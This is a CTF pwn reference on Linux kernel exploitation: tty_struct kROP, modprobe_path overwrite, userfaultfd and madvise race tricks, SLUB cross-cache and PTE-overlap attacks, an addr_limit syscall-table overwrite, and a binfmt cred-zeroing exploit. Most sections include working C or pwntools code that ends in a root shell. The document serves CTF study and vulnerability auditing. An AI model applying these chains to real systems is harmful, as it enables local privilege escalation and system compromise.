# CTF Pwn - Kernel Exploitation Techniques

## Table of Contents
- [tty_struct RIP Hijack and kROP](#tty_struct-rip-hijack-and-krop)
  - [kROP via Fake Vtable on tty_struct](#krop-via-fake-vtable-on-tty_struct)
  - [AAW via ioctl Register Control](#aaw-via-ioctl-register-control)
- [userfaultfd Race Stabilization](#userfaultfd-race-stabilization)
  - [Alternative Race Techniques (uffd Disabled)](#alternative-race-techniques-uffd-disabled)
- [SLUB Allocator Internals](#slub-allocator-internals)
  - [Freelist Pointer Hardening](#freelist-pointer-hardening)
  - [Freelist Obfuscation (CONFIG_SLAB_FREELIST_HARDEN)](#freelist-obfuscation-config_slab_freelist_harden)
- [Leak via Kernel Panic](#leak-via-kernel-panic)
- [Race Window Extension via MADV_DONTNEED + mprotect (DiceCTF 2026)](#race-window-extension-via-madv_dontneed--mprotect-dicectf-2026)
- [Cross-Cache Attack via CPU-Split Strategy (DiceCTF 2026)](#cross-cache-attack-via-cpu-split-strategy-dicectf-2026)
- [PTE Overlap Primitive for File Write (DiceCTF 2026)](#pte-overlap-primitive-for-file-write-dicectf-2026)
- [Kernel addr_limit Bypass via Failed File Open (Midnight Sun CTF 2018)](#kernel-addr_limit-bypass-via-failed-file-open-midnight-sun-ctf-2018)
- [Custom binfmt Loader OOB Read + clear_user for Privesc (CONFidence Teaser 2019)](#custom-binfmt-loader-oob-read--clear_user-for-privesc-confidence-teaser-2019)

For kernel fundamentals (environment setup, heap spray structures, stack overflow, privilege escalation, modprobe_path, core_pattern), see [kernel.md](kernel.md).

For protection bypass techniques (KASLR, FGKASLR, KPTI, SMEP, SMAP), GDB debugging, initramfs workflow, and exploit templates, see [kernel-bypass.md](kernel-bypass.md).

---

## tty_struct RIP Hijack and kROP

### kROP via Fake Vtable on tty_struct

With sequential write over `tty_struct` (at least 0x200 bytes), build a two-phase kROP chain entirely within the structure:

```text
tty_struct layout for kROP:
  +0x00: magic, kref   -> 0x5401 (preserve paranoia check)
  +0x08: dev            -> addr of `pop rsp` gadget (return addr after `leave`)
  +0x10: driver         -> &tty_struct + 0x170 (stack pivot target; must be valid kheap addr)
  +0x18: ops            -> &tty_struct + 0x50 (pointer to fake vtable)
  ...
  +0x50:                -> fake vtable (0x120 bytes), ioctl entry points to `leave` gadget
  ...
  +0x170:               -> actual ROP chain (commit_creds, prepare_kernel_cred, etc.)
```

**Execution flow:**
1. `ioctl(ptmx_fd, cmd, arg)` -> `tty_ioctl()` -> paranoia check passes (magic=0x5401)
2. `tty->ops->ioctl()` -> jumps to `leave` gadget at fake vtable
3. `leave` = `mov rsp, rbp; pop rbp` -- RBP points to `tty_struct` itself
4. RSP now points to `tty_struct + 0x08` (the `dev` field)
5. `ret` to `pop rsp` gadget at `dev`, pops `driver` as new RSP
6. RSP now at `tty_struct + 0x170` -> actual ROP chain runs

**Key insight:** RBP points to `tty_struct` at the time of the vtable call. The `leave` instruction pivots the stack into the structure itself, enabling a two-phase bootstrap: first `leave` to enter the structure, then `pop rsp` to jump to the ROP chain area.

**Alternative:** The gadget `push rdx; ... pop rsp; ... ret` at a fixed offset in many kernels enables direct stack pivot via `ioctl`'s 3rd argument (RDX is fully controlled):

```c
// ioctl(fd, cmd, arg) -> RDX = arg (64-bit controlled)
// Gadget: push rdx; mov ebp, imm; pop rsp; pop r13; pop rbp; ret
// Effect: RSP = arg -> ROP chain at user-specified address
ioctl(ptmx_fd, 0, (unsigned long)rop_chain_addr);
```

### AAW via ioctl Register Control

When full kROP is not needed, use `tty_struct` for Arbitrary Address Write (AAW) to overwrite `modprobe_path`:

Register control from `ioctl(fd, cmd, arg)`:
- `cmd` (32-bit) -> partial control of RBX, RCX, RSI
- `arg` (64-bit) -> full control of RDX, R8, R12

Write gadget in fake vtable: `mov DWORD PTR [rdx], esi; ret`

```c
// Repeated ioctl calls write 4 bytes at a time to modprobe_path
for (int i = 0; i < 4; i++) {
    uint32_t val = *(uint32_t*)("/tmp/evil.sh\0\0\0\0" + i*4);
    ioctl(ptmx_fd, val, modprobe_path_addr + i*4);
}
```

---

## userfaultfd Race Stabilization

`userfaultfd` (uffd) makes kernel race conditions deterministic by pausing execution at page faults.

**How it works:**
1. `mmap()` a region with `MAP_PRIVATE` (no physical pages allocated)
2. Register the region with `userfaultfd` via `ioctl(UFFDIO_REGISTER)`
3. When the kernel accesses this region (e.g., during `copy_from_user()`), a page fault occurs
4. The faulting kernel thread blocks until userspace handles the fault
5. During the block, the exploit modifies shared state (freeing objects, spraying heap, etc.)
6. Userspace resolves the fault via `ioctl(UFFDIO_COPY)`, kernel thread resumes

```c
// Setup
int uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
struct uffdio_api api = { .api = UFFD_API, .features = 0 };
ioctl(uffd, UFFDIO_API, &api);

// Register mmap'd region
void *region = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE,
                    MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
struct uffdio_register reg = {
    .range = { .start = (unsigned long)region, .len = 0x1000 },
    .mode = UFFDIO_REGISTER_MODE_MISSING
};
ioctl(uffd, UFFDIO_REGISTER, &reg);

// Fault handler thread
void *handler(void *arg) {
    struct pollfd pfd = { .fd = uffd, .events = POLLIN };
    while (poll(&pfd, 1, -1) > 0) {
        struct uffd_msg msg;
        read(uffd, &msg, sizeof(msg));
        // >>> RACE WINDOW: kernel thread is paused <<<
        // Free target object, spray heap, etc.

        // Resolve fault to resume kernel
        struct uffdio_copy copy = {
            .dst = msg.arg.pagefault.address & ~0xFFF,
            .src = (unsigned long)src_page,
            .len = 0x1000
        };
        ioctl(uffd, UFFDIO_COPY, &copy);
    }
}
```

**Split object over two pages:** Place a kernel object so it spans a page boundary. The first page is normal; the second triggers uffd. The kernel processes the first half, then blocks on the second half -- the race window occurs mid-operation.

### Alternative Race Techniques (uffd Disabled)

When `CONFIG_USERFAULTFD` is disabled or uffd is restricted to root:

1. **Large `copy_from_user()` buffer:** Pass an enormous buffer to slow down the copy operation, widening the race window
2. **CPU pinning + heavy syscalls:** Pin racing threads to the same core; use heavy kernel functions to extend the timing window
3. **Repeated attempts:** Pure race without stabilization -- run exploit in a loop. Success rate varies (1% to 50% depending on timing)
4. **TSC-based timing (Context Conservation):** Loop checking TSC (Time Stamp Counter) before entering the critical section to confirm execution is at the beginning of its CFS timeslice -- reduces scheduler preemption during the race

---

## SLUB Allocator Internals

### Freelist Pointer Hardening

Since kernel 5.7+, free pointers in SLUB objects are placed in the **middle** of the object (word-aligned), not at offset 0:

```c
// From mm/slub.c
if (freepointer_area > sizeof(void *)) {
    s->offset = ALIGN(freepointer_area / 2, sizeof(void *));
}
```

**Impact:** Simple buffer overflows from the start of a freed chunk cannot reach the free pointer. Underflows from adjacent chunks may still work.

### Freelist Obfuscation (CONFIG_SLAB_FREELIST_HARDEN)

When enabled, free pointers are XOR-obfuscated with a per-cache random value:

```text
stored_ptr = real_ptr ^ kmem_cache->random
```

**Detection:** In GDB, find `kmem_cache_cpu` (via `$GS_BASE + kmem_cache.cpu_slab` offset), follow the `freelist` pointer, and check if the stored values look like valid kernel addresses. If not, obfuscation is active.

---

## Leak via Kernel Panic

When KASLR is disabled (or layout is known) and the kernel uses `initramfs`:

```nasm
jmp &flag   ; jump to the address of the flag file content in memory
```

The kernel panics and the panic message includes the faulting instruction bytes in the `CODE` section -- these bytes are the flag content.

**Prerequisites:** No KASLR (or full layout knowledge), `initramfs` (flag is loaded into kernel memory), RIP control.

---

## Race Window Extension via MADV_DONTNEED + mprotect (DiceCTF 2026)

**Pattern (cornelslop):** Kernel module has a TOCTOU race between check and delete paths, but the window is too narrow to hit reliably. Extend the race window from milliseconds to dozens of seconds by forcing repeated page faults during the long-running kernel operation.

**Technique:**
1. Map memory used by the kernel check operation (e.g., `sha256_va_range()` reading userland pages)
2. From a second thread, loop `MADV_DONTNEED` (drops page table entries) + `mprotect()` (toggles permissions)
3. Each fault during the kernel's hash computation forces VMA lock acquisition and page fault handling
4. The kernel operation stalls repeatedly, keeping the race window open

```c
// Thread 1: trigger the vulnerable CHECK ioctl (long-running hash)
ioctl(fd, CHECK_ENTRY, &entry);

// Thread 2: extend race window by forcing repeated faults
while (racing) {
    madvise(buf, PAGE_SIZE, MADV_DONTNEED);  // drop PTE
    mprotect(buf, PAGE_SIZE, PROT_READ);      // force fault on next access
    mprotect(buf, PAGE_SIZE, PROT_READ | PROT_WRITE);  // restore
}

// Thread 3: trigger the concurrent DEL ioctl
ioctl(fd, DEL_ENTRY, &entry);  // races with CHECK path
```

**Key insight:** `MADV_DONTNEED` drops page table entries without freeing the underlying pages. When the kernel next accesses that userland memory (e.g., during a hash computation), it faults and must re-establish the mapping. Combined with `mprotect()` toggling, this creates lock contention that extends any kernel operation touching userland pages from sub-millisecond to tens of seconds — turning impractical race conditions into reliable exploits.

---

## Cross-Cache Attack via CPU-Split Strategy (DiceCTF 2026)

**Pattern (cornelslop):** Vulnerable object is in a dedicated SLUB cache (not `kmalloc-*`), preventing standard same-cache reclaim after a double-free. Force pages out of the dedicated cache into the buddy allocator by splitting allocation and deallocation across CPUs.

**Technique:**
1. **Allocate N objects on CPU 0** — fills slab pages on CPU 0's partial list
2. **Free the same objects from CPU 1** — freed objects go to CPU 1's partial list (not CPU 0's)
3. CPU 1's partial list overflows to the **node partial list**
4. Completely empty slabs are released to the **PCP (per-CPU page) list**, then to the **buddy allocator**
5. Reallocate those pages as a different object type (e.g., page tables)

```c
// Pin allocation thread to CPU 0
cpu_set_t set;
CPU_ZERO(&set);
CPU_SET(0, &set);
sched_setaffinity(0, sizeof(set), &set);

// Allocate MAX_ENTRIES objects (fills ~3 slab pages)
for (int i = 0; i < MAX_ENTRIES; i++)
    ioctl(fd, ALLOC_ENTRY, &entries[i]);

// Pin free thread to CPU 1
CPU_SET(1, &set);
sched_setaffinity(0, sizeof(set), &set);

// Free from different CPU — objects land on CPU 1's partial list
for (int i = 0; i < MAX_ENTRIES; i++)
    ioctl(fd, FREE_ENTRY, &entries[i]);
// Empty slabs flow: CPU1 partial → node partial → PCP → buddy allocator
```

**Key insight:** SLUB allocates and frees per-CPU. When an object is freed on a different CPU than where it was allocated, it enters a different partial list. When that list overflows, empty slabs are returned to the buddy allocator — escaping the dedicated cache entirely. This enables cross-cache attacks even against custom `kmem_cache_create()` caches that are immune to standard heap spray.

---

## PTE Overlap Primitive for File Write (DiceCTF 2026)

**Pattern (cornelslop):** After reclaiming a freed page as a PTE (page table entry) page, overlap an anonymous writable mapping and a read-only file mapping so both are backed by the same physical page via corrupted PTEs.

**Technique:**
1. Trigger cross-cache double-free to get a page into the buddy allocator
2. Allocate a new anonymous mapping — kernel uses the freed page as a PTE page
3. Map a read-only file (e.g., `/bin/umount`) into the same PTE region
4. The corrupted PTE page now has entries pointing to the file's physical pages
5. Write through the anonymous (writable) mapping → modifies the file's pages directly
6. Overwrite the file's shebang/header to execute an attacker-controlled script

```c
// After cross-cache frees page into buddy allocator:

// 1. Anonymous mapping reclaims the page as PTE storage
char *anon = mmap(NULL, PAGE_SIZE * 512, PROT_READ | PROT_WRITE,
                  MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
// Touch pages to populate PTEs in the reclaimed page
for (int i = 0; i < 512; i++)
    anon[i * PAGE_SIZE] = 'A';

// 2. File mapping into overlapping virtual range
int file_fd = open("/bin/umount", O_RDONLY);
char *file_map = mmap(target_addr, PAGE_SIZE, PROT_READ,
                      MAP_PRIVATE | MAP_FIXED, file_fd, 0);

// 3. Write through anonymous side corrupts file content
// Overwrite ELF header / shebang with #!/tmp/pwn
memcpy(anon + offset, "#!/tmp/pwn\n", 11);

// 4. Execute the corrupted binary → runs attacker script as root
system("/bin/umount /tmp 2>/dev/null");
```

**Key insight:** PTE pages are just regular physical pages repurposed by the kernel's page table allocator. If a freed slab page is reclaimed as a PTE page, both the original (corrupted) slab entries and the new PTE entries coexist. By carefully overlapping anonymous and file-backed mappings in the same PTE page, writes to the anonymous mapping transparently modify file-backed pages — achieving arbitrary file write without any direct kernel write primitive. This bypasses all standard file permission checks since the write happens at the physical page level.

---

## Kernel addr_limit Bypass via Failed File Open (Midnight Sun CTF 2018)

**Pattern:** Kernel module calls `set_fs(KERNEL_DS)` to access userspace pointers, but if a subsequent file open fails, it returns without restoring the old `addr_limit`. Force the failure by making the target file a directory. Now user-space `read()` can access kernel memory.

**Exploitation strategy:**
1. The kernel module has a debug function that sets `addr_limit = KERNEL_DS` to read a debug file
2. If `filp_open()` fails (e.g., target is a directory, not a file), the error path returns early
3. The error path does NOT restore `addr_limit` to its previous value (`USER_DS`)
4. The calling process now has `addr_limit = KERNEL_DS` permanently
5. Ordinary `read()`/`write()` syscalls can now access kernel memory addresses
6. Use this to overwrite syscall table entries with `prepare_kernel_cred`/`commit_creds`

```c
#include <sys/stat.h>
#include <unistd.h>
#include <fcntl.h>

#define DEBUG_FILE "/tmp/debug_log"
#define SYS_TABLE_ADDR 0xffffffff81801400  // from /proc/kallsyms

// Step 1: Make debug file a directory -> filp_open() fails with -EISDIR
mkdir(DEBUG_FILE, 0);

// Step 2: Trigger the kernel module's debug function
int fd = open("/dev/vuln_module", O_RDWR);
read(fd, &c, 1);  // Triggers debug_msg(), leaves addr_limit = KERNEL_DS

// Step 3: Now read()/write() can access kernel memory
// Use pipe as a kernel-memory read/write primitive:
int pipefd[2];
pipe(pipefd);

// Write prepare_kernel_cred address to syscall 100
unsigned long pkc_addr = 0xffffffff810a9ef0;  // prepare_kernel_cred
write(pipefd[1], &pkc_addr, sizeof(pkc_addr));
read(pipefd[0], (void*)((unsigned long*)SYS_TABLE_ADDR + 100), sizeof(unsigned long));

// Write commit_creds address to syscall 101
unsigned long cc_addr = 0xffffffff810a9d80;  // commit_creds
write(pipefd[1], &cc_addr, sizeof(cc_addr));
read(pipefd[0], (void*)((unsigned long*)SYS_TABLE_ADDR + 101), sizeof(unsigned long));

// Step 4: Call the overwritten syscalls to get root
int creds = syscall(100, 0);   // prepare_kernel_cred(0)
syscall(101, creds);            // commit_creds(creds)
// Now running as root
system("/bin/sh");
```

**Key insight:** When a kernel module sets `addr_limit` to `KERNEL_DS` for kernel pointer access but fails to restore it on error paths, userspace processes retain the elevated `addr_limit`. This turns ordinary `read()`/`write()` syscalls into kernel memory read/write primitives. Always audit kernel module error paths for missing `set_fs()` restoration -- triggering the error (e.g., making a file path point to a directory) is often trivial.

**References:** Midnight Sun CTF 2018

---

## Custom binfmt Loader OOB Read + clear_user for Privesc (CONFidence Teaser 2019)

**Pattern (p4fmt):** Kernel module `p4fmt.ko` registers a new `binfmt` handler for files starting with `"P4"`. The loader reads a user-controlled header: `{magic, version, arg, load_count, header_offset, entry}` followed by `load_count` `{addr, length, offset}` entries. Two missing checks make this a full privesc primitive: `header_offset` is used unvalidated as a pointer offset into `bprm->buf[]` (OOB read of the kernel-side `linux_binprm` struct, including `struct cred *cred`), and `loads[i].addr | 8` selects a branch that calls `_clear_user(addr, length)` with fully attacker-controlled arguments — an arbitrary zeroing primitive that runs *before* `install_exec_creds()` commits `bprm->cred`.

```python
from pwn import *

# Stage 1: leak bprm->cred via OOB header_offset into the kernel-side linux_binprm buffer.
# load_count=5, header_offset=0x80-0x18 -> loads[] parsed from fields past bprm->buf.
leak = b'P4' + p8(0) + p8(1) + p32(5) + p64(0x80 - 0x18) + p64(0)
# Execute -> dmesg "vm_mmap(..., length=<cred_addr>, ...)" reveals the cred pointer.

# Stage 2: zero uid/gid/suid/sgid/euid/egid/fsuid/fsgid in bprm->cred via clear_user.
# arg=1 with load entries whose addr has bit 3 set -> kernel calls _clear_user(addr, length).
cred = 0xffff...          # from leak
entries  = p64(0x7000000 | 7) + p64(0x1000) + p64(0)            # mmap RWX page for shellcode
entries += p64((cred + 0x10) | 8) + p64(0x48) + p64(0)          # clear_user(cred->uid..fsgid)
binary   = b'P4' + p8(0) + p8(1) + p32(2) + p64(0x18) + p64(0x7000090) + entries
binary   = binary.ljust(0x7000090 & 0xfff, b'\x00') + asm(shellcraft.sh())
# exec -> install_exec_creds sees a cred with uid=0 -> root shell (drop_privileges bypass)
```

**Key insight:** Custom `binfmt_misc`-style loaders are a fertile target because they parse attacker-supplied headers *before* `install_exec_creds` commits the per-exec credential struct. Any primitive that touches `bprm` in that window (OOB read to leak `bprm->cred`, arbitrary `_clear_user` to zero cred fields, `vm_mmap` with controlled flags/prot for kernel-aided RWX) composes into privesc without needing a traditional kernel memory-corruption chain. Always audit `load_*_binary` functions in custom modules for (a) bounds on header offsets and counts, (b) `access_ok`/range checks on `addr`/`length` arguments passed to `_clear_user`/`copy_to_user`, and (c) side-channel info leaks via `printk`.

**References:** CONFidence CTF 2019 Teaser — p4fmt, writeup 13992
